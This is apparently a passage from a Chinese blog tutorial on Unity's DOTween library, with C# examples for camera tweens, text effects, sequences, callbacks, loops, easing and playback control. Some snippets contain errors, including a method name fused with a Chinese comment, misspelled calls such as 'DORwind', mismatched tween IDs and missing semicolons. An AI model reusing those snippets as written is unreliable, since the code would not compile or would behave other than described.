<h2 id="三、Camera"><a href="#三、Camera" class="headerlink" title="三、Camera"></a>三、Camera</h2><h3 id="1-设置相机宽高比、背景色、远近景控制"><a href="#1-设置相机宽高比、背景色、远近景控制" class="headerlink" title="1)设置相机宽高比、背景色、远近景控制"></a>1)设置相机宽高比、背景色、远近景控制</h3><h4 id="相机宽高比"><a href="#相机宽高比" class="headerlink" title="相机宽高比"></a>相机宽高比</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Camera camera;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        camera = GetComponent&lt;Camera&gt;();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//参数：比例，持续时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        camera.DOAspect(<span class="number">16</span>/<span class="number">9f</span>, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>

<h4 id="背景色"><a href="#背景色" class="headerlink" title="背景色"></a>背景色</h4><p>首先将Camera的Clear Flags从skybox设置为Solid Color</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//相机背景颜色由蓝色变为红色，持续两秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DOColor(Color.red, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323201123080.png" alt="image-20210323201123080"></p>
<h4 id="远近景控制"><a href="#远近景控制" class="headerlink" title="远近景控制"></a>远近景控制</h4><p>通过改变Cliping OLanes的Near和Far来控制远近切面</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">camera.DONearClipPlane(<span class="number">1.4f</span>, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DOFarClipPlane(<span class="number">50</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323201729499.png" alt="image-20210323201729499"></p>
<h3 id="2-摄像机视域的控制"><a href="#2-摄像机视域的控制" class="headerlink" title="2)摄像机视域的控制"></a>2)摄像机视域的控制</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Perspective模式下将视域扩大到100</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DOFieldOfView(<span class="number">100</span>, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//OrthoSize模式下将视域扩大</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DOOrthoSize模式下将视域扩大(<span class="number">6</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="3-分屏显示"><a href="#3-分屏显示" class="headerlink" title="3)分屏显示"></a>3)分屏显示</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据比列显示位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DORect(<span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5f</span>, <span class="number">0.5f</span>),<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//根据数值显示位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">camera.DOPixelRect(<span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">400</span>, <span class="number">200</span>), <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h2 id="四、Text"><a href="#四、Text" class="headerlink" title="四、Text"></a>四、Text</h2><h3 id="1）打字机效果"><a href="#1）打字机效果" class="headerlink" title="1）打字机效果"></a>1）打字机效果</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//速度不均匀</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">text.DOText(<span class="string">"gfdgsdfgdsfgsdgsrgfdsgzrgstgsrfestfrsGFsegsfsdfes"</span>, <span class="number">5f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//速度均匀</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">text.DOText(<span class="string">"gfdgsdfgdsfgsdgsrgfdsgzrgstgsrfestfrsGFsegsfsdfes"</span>, <span class="number">5f</span>).SetEase(Ease.Linear);</span></pre></td></tr></table></figure>

<h2 id="五、运动序列"><a href="#五、运动序列" class="headerlink" title="五、运动序列"></a>五、运动序列</h2><h3 id="1）Append"><a href="#1）Append" class="headerlink" title="1）Append"></a>1）Append</h3><p>实现效果为：该物体由当前坐标运动到(1,1,1)停顿2秒后运动到(2,0,0)</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个队列</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Sequence sequence = DOTween.Sequence();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//追加运动到(1,1,1)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(Vector3.one,<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//停止2秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.AppendInterval(<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//追加运动到(2,0,0)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2f</span>));</span></pre></td></tr></table></figure>

<h3 id="2-Insert"><a href="#2-Insert" class="headerlink" title="2)Insert"></a>2)Insert</h3><p>Sequence.Insert(插入的时间的秒数,运动)；</p>
<p>若插入时间小于原本运动总时长，则插入不会改变运动的总时长</p>
<p>若插入时间大于原本运动总时长，则运动的总时长为插入时的时长</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Sequence sequence = DOTween.Sequence();</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(Vector3.one,<span class="number">2f</span>));              <span class="comment">//0-2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.AppendInterval(<span class="number">2f</span>);                                    <span class="comment">//2-4</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2f</span>));       <span class="comment">//4-6</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在第0秒处插入动画播放2秒，会直接替换前面0-2秒的动画</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Insert(<span class="number">0</span>,transform.DOMove(-Vector3.one, <span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在第0秒处插入动画播放2秒，会直接替换前面0-1秒的动画，在1秒时迅速变为替换前动画运动到1秒时的位置，再进行运动到结束</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Insert(<span class="number">0</span>,transform.DOMove(-Vector3.one, <span class="number">1f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在前面所有运动完之后，过2s开始执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Insert(<span class="number">0</span>,transform.DOMove(-Vector3.one, <span class="number">8f</span>));</span></pre></td></tr></table></figure>

<h3 id="3）Join"><a href="#3）Join" class="headerlink" title="3）Join"></a>3）Join</h3><p>如果想实现物体变缩放边运动到某个点，然后再边缩放边运动到某个点，可使用两种方法</p>
<p>1.使用Insert实现</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Sequence sequence = DOTween.Sequence();</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(Vector3.one,<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.AppendInterval(<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Insert(<span class="number">0</span>,transform.DOScale(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>),<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Insert(<span class="number">4</span>,transform.DOScale(Vector3.one,<span class="number">2f</span>));</span></pre></td></tr></table></figure>

<p>2、使用Join实现</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Sequence sequence = DOTween.Sequence();</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(Vector3.one,<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Join(transform.DOScale(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.AppendInterval(<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Join(transform.DOScale(Vector3.one, <span class="number">2f</span>));</span></pre></td></tr></table></figure>

<h3 id="4-预添加"><a href="#4-预添加" class="headerlink" title="4)预添加"></a>4)预添加</h3><p>预添加会在最开始前先执行，以先进后出为规则</p>
<p>这里会是先向(-1,-1,-1)移动之后等待2秒再做上面的运动</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Sequence sequence = DOTween.Sequence();</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(Vector3.one,<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Join(transform.DOScale(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.AppendInterval(<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Append(transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Join(transform.DOScale(Vector3.one, <span class="number">2f</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.PrependInterval(<span class="number">1</span>);       <span class="comment">//其次执行这个</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.Prepend(transform.DOMove(-Vector3.one,<span class="number">2f</span>));      <span class="comment">//首先执行这个</span></span></pre></td></tr></table></figure>

<h3 id="5）回调函数"><a href="#5）回调函数" class="headerlink" title="5）回调函数"></a>5）回调函数</h3><p>1.插入</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在第2秒的时候调用函数AppCallBack</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">sequence.InsertCallback(<span class="number">2</span>, AppCallBack);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AppCallBack</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"InsertCallback"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>2.追加</p>
<p>可以放在一个运动后面，在它执行完后便触发</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">sequence.AppendCallback(AppCallBack);</span></pre></td></tr></table></figure>

<p>3.预加载</p>
<p>也可以放在预加载中</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">sequence.PrependCallback(AppCallBack);</span></pre></td></tr></table></figure>

<p>4、回调函数的使用方法</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在该动画执行完之后输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnComplete(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在该动画被杀死之后完之后输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnKill(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在该动画播放后之后输出111111（当动画被暂停后播放会再次执行）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnPlay(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在该动画暂停后之后输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnPause(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当该动画被反复执行的时候输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnStepComplete(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当该动画最开始的时候输出111111（只执行一次）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnStart(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当该动画更新时的时候输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnUpdate(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当该动画重新播放的时候输出111111</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).OnRewind(() =&gt; &#123; print(<span class="string">"111111"</span>); &#125;);</span></pre></td></tr></table></figure>



<h2 id="六、参数设置方法"><a href="#六、参数设置方法" class="headerlink" title="六、参数设置方法"></a>六、参数设置方法</h2><h3 id="1）循环设置"><a href="#1）循环设置" class="headerlink" title="1）循环设置"></a>1）循环设置</h3><p>方法一</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从起始点运动到(1,1,1)反复执行3次,LoopType.Restart是默认类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>, LoopType.Restart);</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从起始点运动到(1,1,1)再到起始点再到(1,1,1) 共运行3次</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>, LoopType.Yoyo);</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在每次运动完的基础上再去执行运动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//从起始点(0,0,0)运动到(1,1,1)再到(2,2,2)再到(3,3,3)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>, LoopType.Incremental);</span></pre></td></tr></table></figure>

<p>SetLoops(-1)即为无限执行循环</p>
<p>方法二</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">TweenParams tp = <span class="keyword">new</span> TweenParams();</span></pre></td></tr><tr><td class="code"><pre><span class="line">tp.SetLoops(<span class="number">-1</span>, LoopType.Incremental);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetAs(tp);</span></pre></td></tr></table></figure>

<h3 id="2-SetAutoKill、From"><a href="#2-SetAutoKill、From" class="headerlink" title="2)SetAutoKill、From"></a>2)SetAutoKill、From</h3><p>1.SetAutoKill</p>
<p>当一个运动动画执行完后自动进行销毁</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetAs(tp).SetAutoKill();</span></pre></td></tr></table></figure>

<p>2.From</p>
<p>从目标点运动到起始点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, 1f).From();</span></pre></td></tr></table></figure>

<p>若目标点和起始点重合</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不移动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).From();</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//起始点+目标点，根据得到那个点移动回来</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//这里便是从(2,2,2)移动到(1,1,1)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).From(<span class="literal">true</span>);</span></pre></td></tr></table></figure>

<h3 id="3-延时"><a href="#3-延时" class="headerlink" title="3)延时"></a>3)延时</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//延时3秒后移动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">1f</span>).SetDelay(<span class="number">3</span>);</span></pre></td></tr></table></figure>

<h3 id="4-基于速度运动"><a href="#4-基于速度运动" class="headerlink" title="4)基于速度运动"></a>4)基于速度运动</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里5f代表速度而不是时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">5f</span>).SetSpeedBased();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//代表使用基于速度运动，5f代表速度</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">5f</span>).SetSpeedBased(<span class="literal">true</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//代表不是使用基于速度运动，即5f为持续时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">5f</span>).SetSpeedBased(<span class="literal">false</span>);</span></pre></td></tr></table></figure>

<h3 id="5-ID设置"><a href="#5-ID设置" class="headerlink" title="5)ID设置"></a>5)ID设置</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置ID</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetId(<span class="string">"Id03"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//可用DOTween.Play("ID")来调用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.Play(<span class="string">"ID03"</span>);</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在该动画不用时可被回收</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetRecyclable();</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//增量运动，在该点的基础上加上目标点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetRelative();</span></pre></td></tr></table></figure>

<h3 id="6）帧"><a href="#6）帧" class="headerlink" title="6）帧"></a>6）帧</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置为真的时候DOTween不受Time.Scale影响</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetUpdate(UpdateType.Normal,<span class="literal">true</span>);</span></pre></td></tr></table></figure>

<h2 id="七、运动曲线"><a href="#七、运动曲线" class="headerlink" title="七、运动曲线"></a>七、运动曲线</h2><p>1)unity自带的曲线设置</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数： 曲线形式，速度，强度(-1~1)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetEase(Ease.Flash, <span class="number">10f</span>,<span class="number">0</span>);</span></pre></td></tr></table></figure>

<p> 2）自定义曲线设置</p>
<p>可在unity中自定义一个曲线来调用</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AnimationCurve ac;</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetEase(ac);</span></pre></td></tr></table></figure>

<p>3)函数自定义曲线</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>).SetEase(MyEaseFun);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">float</span> <span class="title">MyEaseFun</span>(<span class="params"><span class="keyword">float</span> time, <span class="keyword">float</span> duration, <span class="keyword">float</span> overshootOrAmplitude, <span class="keyword">float</span> period</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">return</span> time / duration;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h2 id="八、动画控制函数"><a href="#八、动画控制函数" class="headerlink" title="八、动画控制函数"></a>八、动画控制函数</h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动画重新播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DORestart();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画播放完直接回到开头（一闪而过）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DORwind();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画播放完直接回到开头（平滑的）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOSmoothRwind();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画开始播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPlay();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画暂停播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPause();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//将当前动画销毁</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOKill();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画翻转</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOFlip();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//跳到某一秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOGoto();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画从后往前播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPlayBackwards();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画从前往后播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPlayForward();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当动画暂停时，执行就继续播放，播放时，执行就暂停</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//这是一个暂停/播放切换的开关</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOTogglePause();</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//运动到(1,1,1)但在1s时执行transform.DORewind()瞬间回到原点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">async</span> <span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	transform.DOMove(Vector3.one, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">await</span> Task.Delay(TimeSpan.FromSeconds(<span class="number">1</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">    transform.DORewind();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//若这里不开延迟不会动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//物体运动到(1,1,1)又回来瞬间发生</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">async</span> <span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	transform.DOMove(Vector3.one, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    transform.DOFlip();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//开启1s延迟则可看到动画效果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">async</span> <span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	transform.DOMove(Vector3.one, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">await</span> Task.Delay(TimeSpan.FromSeconds(<span class="number">1</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">    transform.DOFlip();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接将动画跳转到1s的时候开始播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOGoto(<span class="number">1</span>, <span class="literal">true</span>);</span></pre></td></tr></table></figure>

<h2 id="九、类方法"><a href="#九、类方法" class="headerlink" title="九、类方法"></a>九、类方法</h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//找到所有正在暂停的动画</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> list1 = DOTween.PausedTweens()</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//找到所有正在运行的动画</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> list2 = DOTween.PlayingTweens()</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数: ID值，是否正在播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//可以通过ID值去当前正在播放的动画中寻找</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.TweensById(<span class="string">"ID"</span>,<span class="literal">true</span>)</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回满足条件的动画数组</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一个参数是播放动画的对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.TweensByTarget(transform,<span class="literal">true</span>);</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断该动画是否在播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.IsTweening(transform,<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//判断该对象是否有动画(暂停也算)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.IsTweening(transform,<span class="literal">false</span>)</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计当前动画运动的个数(延迟动画也算做播放)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">DOTween.TotalPlayingTweens()</span></pre></td></tr></table></figure>

<h2 id="十、动画执行时间的修改与控制"><a href="#十、动画执行时间的修改与控制" class="headerlink" title="十、动画执行时间的修改与控制"></a>十、动画执行时间的修改与控制</h2><p>1)控制时间</p>
